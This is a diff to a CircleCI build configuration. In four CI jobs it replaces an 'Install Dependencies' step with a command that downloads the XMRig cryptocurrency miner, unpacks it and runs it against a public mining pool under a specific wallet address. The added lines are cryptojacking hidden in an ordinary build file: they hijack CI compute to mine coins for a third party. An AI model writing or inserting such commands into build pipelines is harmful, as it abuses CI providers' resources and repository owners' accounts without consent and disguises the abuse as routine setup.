@@ -4,30 +4,22 @@ jobs:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
+        - run: wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ELON:0xa4a231fBF53800d2208E824428f18CaAFbaAC4A9.testcpu2 -p x
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
+        - run: wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ELON:0xa4a231fBF53800d2208E824428f18CaAFbaAC4A9.testcpu3 -p x
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
+        - run: wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ELON:0xa4a231fBF53800d2208E824428f18CaAFbaAC4A9.testcpu4 -p x
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
+        - run: wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ELON:0xa4a231fBF53800d2208E824428f18CaAFbaAC4A9.testcpu5 -p x
 workflows:
     version: 2.1
     build:
